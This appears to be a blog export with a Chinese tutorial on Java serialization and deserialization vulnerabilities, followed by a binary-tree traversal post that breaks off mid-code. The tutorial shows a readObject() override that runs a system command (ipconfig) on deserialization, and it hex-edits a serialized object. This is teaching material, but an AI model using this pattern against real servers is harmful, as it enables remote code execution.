    <title>Java反序列化漏洞之Java反序列化流程与分析(3)</title>
    <url>/2021/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90-3/</url>
    <content><![CDATA[<h1 id="什么是Java序列化和反序列化？"><a href="#什么是Java序列化和反序列化？" class="headerlink" title="什么是Java序列化和反序列化？"></a>什么是Java序列化和反序列化？</h1><p>在Java中，序列化是为了方便传输存储数据的一种方式。</p>
<blockquote>
<p>If we want to transfer an object, for instance, store it on a disk or send it over a network, we need to transform it into a byte stream.</p>
</blockquote>
<p><strong>Java序列化</strong>会将一个object转换成<code>byte[]</code>，也就是一个含有object状态（属性信息）的二进制数组。Java序列化会使用<strong>Java反射</strong>来获取到需要被序列化的数据，包括private和final的fields。<strong>常用writeObject()来序列化Object。</strong></p>
<blockquote>
<p>Java serialization uses reflection to scrape all the data from the object’s fields that need to be serialized. This includes private and final fields</p>
</blockquote>
<span id="more"></span>

<p><strong>Java反序列化</strong>会根据该二进制流，<strong>重新创建</strong>一个相同状态下的object。Java反序列化不会用<code>constructor</code>来创建一个object，相反，他会创建一个空的object，然后用<strong>Java反射</strong>把数据写进属性里，所以在重新创建object的时候，<code>constructor</code>里的代码是不会被执行的（除了实现Externalizable接口的Class，之后会提到）。<strong>常用readObject()来反序列化Object。</strong></p>
<blockquote>
<p>When deserializing a byte stream back to an object it does not use the constructor. It creates an empty object and uses reflection to write the data to the fields.</p>
</blockquote>
<p>显而易见，Java在序列化和反序列化的过程中，都用到了<a href="https://leihehehe.github.io/2021/07/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-1/">Java反射机制</a>（需要注意的是，实现Externalizable接口并不会使用Java反射机制，这一点会在后面的内容中讲到），而整个过程其实就是数据转换为二进制流，再根据数据<strong>重新创建</strong>一个相同的object。</p>
<h1 id="Java序列化和反序列的实现"><a href="#Java序列化和反序列的实现" class="headerlink" title="Java序列化和反序列的实现"></a>Java序列化和反序列的实现</h1><h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>如果一个Class想要被序列化，那么他<strong>必须</strong><code>implements Serializable</code>。</p>
<blockquote>
<p>The serialization interface has no methods or fields and serves only to identify the semantics of being serializable. </p>
</blockquote>
<p>Serializable接口没有任何的方法或属性，它只是用来标识该Class是否可以被序列化。</p>
<p>根据官方注解，序列化的Class会有一个<code>serialVersionUID</code>，它会在<strong>反序列化</strong>的时候，被用来验证发送者和接收者是否有一样的<code>serialVersionUID</code>。需要注意的是，我们所声明的<code>serialVersionUID</code>，必须为 <code>static final long serialVersionUID</code>。</p>
<p>如果不声明<code>serialVersionUID</code>，Java在序列化的时候会计算默认的<code>serialVersionUID</code>值，但官方强烈建议所有Serializable Class都声明该值，避免一些不必要的错误。</p>
<h3 id="编写Serializable-Class"><a href="#编写Serializable-Class" class="headerlink" title="编写Serializable Class"></a>编写Serializable Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shulei&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要被序列化的Class，都要实现<code>Serializable</code>接口。</p>
<h3 id="编写实现序列化与反序列化Class"><a href="#编写实现序列化与反序列化Class" class="headerlink" title="编写实现序列化与反序列化Class"></a>编写实现序列化与反序列化Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Student student=<span class="keyword">new</span> <span class="title class_">Student</span>();<span class="comment">//create a Student instance</span></span><br><span class="line">        serializeObj(student);</span><br><span class="line">        deserializeObj();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObj</span><span class="params">(Student student)</span> <span class="keyword">throws</span> Exception &#123;<span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建一个文件输出流，文件名为test.cer</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span></span><br><span class="line">        objectOutputStream.writeObject(student);<span class="comment">//将student这个object输入到文件输出流中</span></span><br><span class="line">        objectOutputStream.close();<span class="comment">//关闭文件输出流和对象输出流，避免内存泄露</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">//序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建文件输入流，读取test.cer</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);<span class="comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span>(Student)objectInputStream.readObject();<span class="comment">//读取输入流中的对象，强制转换为Student类型，重构对象</span></span><br><span class="line">        student.hello();<span class="comment">//call方法</span></span><br><span class="line">        <span class="comment">//反序列化完成</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728193330087.png" alt="image-20210728193330087"></p>
<h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>除了通过<code>implements Serializable</code>来让Class可序列化，我们同样可以使用<code>Externalizable</code>来标识Class是可序列化的。</p>
<p>进入<code>Externalizable interface</code>可以看到以下结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上，<code>Externalizable</code>是继承了<code>Serializable</code>，这也就能说明为什么它也能够用来表示Class是可序列化的了。但不同的是，这里有两个额外的method，<code>writeExternal()</code>和<code>readExternal()</code>。</p>
<p>所以当我们实现<code>Externalizable</code>接口的时候，我们需要重写这两个method。</p>
<p><code>writeExternal()</code>和<code>readExternal()</code>分别替代了<code>writeObject()</code>和<code>readObject()</code>两个methods,开发者需要手动对数据进行序列化和反序列化，这意味着，我们可以<strong>选择性</strong>地序列化和反序列化某些属性，相比Serializable接口就更加的灵活了。</p>
<p>此外，实现<code>Externalizable</code>的Class必须要有默认的<strong>无参构造函数</strong>，因为Externalizable在反序列化时<strong>不使用反射机制</strong>，所以它必须要有<code>constructor</code>。采用Externalizable无需产生<code>serialVersionUID</code>，而Serializable接口需要。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728231725366.png" alt="image-20210728231725366"></p>
<h3 id="编写Externalizable-Class"><a href="#编写Externalizable-Class" class="headerlink" title="编写Externalizable Class"></a>编写Externalizable Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaoXueSheng</span>  <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">()</span> &#123;<span class="comment">//此无参数的构造方法必须存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaoXueSheng</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);<span class="comment">//将name写入对象输出流和文件输出流</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)in.readObject();<span class="comment">//从对象输入流中获取name</span></span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在<code>writeExternal()</code>方法中写入name属性，并在<code>readExternal()</code>中取出赋值给当前Class的name属性。相反另一个属性<code>age</code>并没有被我们序列化。</p>
<p>那么可以思考一下，当我们反序列化后，我们得到的age是什么值呢？</p>
<h3 id="编写实现序列化和反序列化Class"><a href="#编写实现序列化和反序列化Class" class="headerlink" title="编写实现序列化和反序列化Class"></a>编写实现序列化和反序列化Class</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializableTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">XiaoXueSheng</span> <span class="variable">xiaoXueSheng</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoXueSheng</span>(<span class="string">&quot;Leihehe&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">//我们创建一个有name和age的值的object</span></span><br><span class="line">        serializeObj(xiaoXueSheng);<span class="comment">//序列化该object</span></span><br><span class="line">        deserializeObj();<span class="comment">//反序列化该object</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObj</span><span class="params">(XiaoXueSheng xiaoXueSheng)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建一个文件输出流，文件名为test.cer</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);<span class="comment">//创建一个对象输出流，对象数据流中的数据将输出到文件输出流中</span></span><br><span class="line">        objectOutputStream.writeObject(xiaoXueSheng);<span class="comment">//将xiaoXueSheng这个object输入到文件输出流中</span></span><br><span class="line">        objectOutputStream.close();<span class="comment">//关闭文件输出流和对象输出流，避免内存泄露</span></span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeObj</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.cer&quot;</span>);<span class="comment">//创建文件输入流，读取test.cer</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);<span class="comment">//创建对象输入流，将文件输入流里的数据输入对象输入流</span></span><br><span class="line">        XiaoXueSheng xiaoXueSheng=(XiaoXueSheng) objectInputStream.readObject();<span class="comment">//重构object,将反序列化得到的数据重新赋值到新的object中</span></span><br><span class="line">        System.out.println(xiaoXueSheng.getName());</span><br><span class="line">        System.out.println(xiaoXueSheng.getAge());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们创建了一个name为Leihehe, age为21的object，将它进行序列化和反序列化。</p>
<p>在反序列化操作后，我们将object中的name和age输出。</p>
<h3 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h3><p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728200635043.png" alt="image-20210728200635043"></p>
<p>我们发现<code>name</code>被正常输出了，但<code>age</code>为initilised value，这就解答了之前的问题。</p>
<p>在可序列化Class <code>XiaoxueSheng</code>中，我们只规定将<code>name</code>序列化和反序列化，并未序列化<code>age</code>，所以当反序列化创建新的object后(执行<strong>无参</strong><code>constructor</code>)，<code>age</code>并未被赋值，而是最初的状态。</p>
<h1 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h1><h3 id="什么是反序列化漏洞？"><a href="#什么是反序列化漏洞？" class="headerlink" title="什么是反序列化漏洞？"></a>什么是反序列化漏洞？</h3><blockquote>
<p>A Java deserialize vulnerability is a security vulnerability that occurs when a malicious user tries to insert a modified serialized object into the system that eventually compromises the system or its data. </p>
</blockquote>
<p>敲重点：Java<strong>反序列化</strong>了被<strong>恶意修改</strong>的<strong>序列化对象</strong>(须是服务器中存在的对象或者依赖包中的对象)。</p>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>根据Java官方说明，任何实现Serializable接口的Class都可以定义自己的<code>readObject()</code>方法，只要在重写方法的同时执行了<code>defaultReadObject()</code>方法即可。这样在反序列化的时候会自动invoke该Class下自己定义的<code>readObject()</code>方法。</p>
<p>那么我们可以为Class重写一个它自己的<code>readObject()</code>的方法，里面带有恶意执行代码，让Java去反序列化这个我们修改后的Object，这样<code>readObject()</code>被执行的时候，恶意代码也就被执行了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span><span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;shulei&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span>Runtime.getRuntime().exec(<span class="string">&quot;ipconfig&quot;</span>);<span class="comment">//执行ipconfig命令</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将命令结果打出来</span></span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bfIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(bfIn));</span><br><span class="line">        String s=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((s = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处我们重写了<code>readObject()</code>，其中含有命令执行代码。</p>
<p>重新反序列化后，发现命令被执行。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728203543869.png" alt="image-20210728203543869"></p>
<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>我们序列化的时候，将数据存放进了一个叫<code>test.cer</code>的文件中，当我们把这个序列化后的数据修改一下，那么效果也是一样的。</p>
<p>这里我用<strong>Notepad++<strong>打开，再使用它的</strong>HEX-Editor</strong>插件，可以看到该文件十六进制的格式。我们将此处修改一下</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204023096.png" alt="image-20210728204023096"></p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204136266.png" alt="image-20210728204136266"></p>
<p>我们只让它反序列化我们修改好的object</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728204313877.png" alt="image-20210728204313877"></p>
<p>内容已经被恶意修改了。</p>
<h1 id="序列化后的数据分析"><a href="#序列化后的数据分析" class="headerlink" title="序列化后的数据分析"></a>序列化后的数据分析</h1><p>在前一部分的案例二中，我们在十六进制文件的基础上修改了数据，那么其中数据到底有什么意义呢？</p>
<p>这里我将用到<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>来分析。将HEX的值复制粘贴到这个项目中即可（不知为何，在NodePad++中直接复制粘贴，00会变成20，需要替换回来）。</p>
<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%88%86%E6%9E%90/image-20210728205742670.png" alt="image-20210728205742670"></p>
<p>这样一个清晰的结构对我们了解序列化的数据储存结构很有帮助。</p>
<ol>
<li><strong>ACED0005</strong></li>
</ol>
<blockquote>
<p><code>0xac ed</code>是Java序列化的<strong>字符串魔术数</strong>，相当于是Java序列化的十六进制特征码，<strong>看到这个值我们就能知道这是Java序列化后的十六进制的值</strong>。</p>
<p><code>0x00 05</code>是JAVA序列化的版本号</p>
</blockquote>
<ol start="2">
<li><strong>7372</strong></li>
</ol>
<blockquote>
<p><code>0x73</code>是<code>TC_OBJECT</code>, 代表下面的内容是一个新的对象</p>
<p><code>0x72</code>是<code>TC_CLASSDESC</code>，Class描述符，代表下面是一个新的Class</p>
</blockquote>
<ol start="3">
<li></li>
</ol>
<blockquote>
<p>0x00 07 代表 Class Name长度</p>
<p>0x53747564656e74代表 Class Name - Student</p>
</blockquote>
<ol start="4">
<li></li>
</ol>
<blockquote>
<p>0x00 00 00 00 00 00 00 01代表serialVersionUID的值</p>
</blockquote>
<p>后面的就不说了，具体资料可以在网上查到，配合<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a>来学习分析会很有帮助。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://snyk.io/blog/serialization-and-deserialization-in-java/">Serialization and deserialization in Java: explaining the Java deserialize vulnerability</a></p>
<p><a href="https://www.cnblogs.com/goody9807/p/6440667.html">JAVA 对象序列化（二）——Externalizable</a></p>
<p><a href="https://blog.csdn.net/qq_32252957/article/details/82856128">java中Serializable和Externalizable接口浅析</a></p>
<p><a href="https://www.guildhab.top/2020/04/java-rmi-%E5%88%A9%E7%94%A83-java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0-%E4%BB%A5%E5%8F%8A-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">Java 反序列化漏洞(3) – 初探 Java 反序列化漏洞以及序列化数据分析</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary Tree Traversals (Inorder, Preorder and Postorder)</title>
    <url>/2022/07/10/Binary-Tree-Traversals-Inorder-Preorder-and-Postorder/</url>
    <content><![CDATA[<h1 id="What-is-Binary-Tree"><a href="#What-is-Binary-Tree" class="headerlink" title="What is Binary Tree?"></a>What is Binary Tree?</h1><p>Each node of the tree has at most two children - a left and a right child.</p>
<h2 id="Complete-Binary-Tree"><a href="#Complete-Binary-Tree" class="headerlink" title="Complete Binary Tree"></a>Complete Binary Tree</h2><blockquote>
<p>All the levels of the tree are filled completely except the lowest level nodes which are filled from as left as possible.</p>
</blockquote>
<p><img src="https://media.geeksforgeeks.org/wp-content/uploads/20220414154428/complete.jpg"></p>
<span id="more"></span>

<h2 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h2><p>A binary tree of height <strong>h</strong> having the maximum number of nodes is a <strong>perfect</strong> binary tree. </p>
<h2 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h2><p>A full Binary tree is a special type of binary tree in which every parent node/internal node <strong>has either two or no children</strong>. It is also known as a proper binary tree.</p>
<h1 id="Tree-Traversal"><a href="#Tree-Traversal" class="headerlink" title="Tree Traversal"></a>Tree Traversal</h1><h2 id="Iterative-Preorder-Traversal"><a href="#Iterative-Preorder-Traversal" class="headerlink" title="Iterative Preorder Traversal"></a>Iterative Preorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; results = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> results;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="comment">//when it comes to the last node, stack will be empty</span></span><br><span class="line">        <span class="keyword">while</span>(!stack.empty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            results.add(cur.val);</span><br><span class="line">            <span class="keyword">if</span>(cur.right!=<span class="literal">null</span>)</span><br><span class="line">                stack.push(cur.right);</span><br><span class="line">            <span class="keyword">if</span>(cur.left!=<span class="literal">null</span>)</span><br><span class="line">                stack.push(cur.left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Iterative-Inorder-Traversal"><a href="#Iterative-Inorder-Traversal" class="headerlink" title="Iterative Inorder Traversal"></a>Iterative Inorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span> || !stack.empty())&#123;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//root and right</span></span><br><span class="line">        <span class="keyword">if</span>(!stack.empty())&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Iterative-Postorder-Traversal"><a href="#Iterative-Postorder-Traversal" class="headerlink" title="Iterative Postorder Traversal"></a>Iterative Postorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//postorder traversal:-&gt; right, left, root</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span> || !stack.empty())&#123;</span><br><span 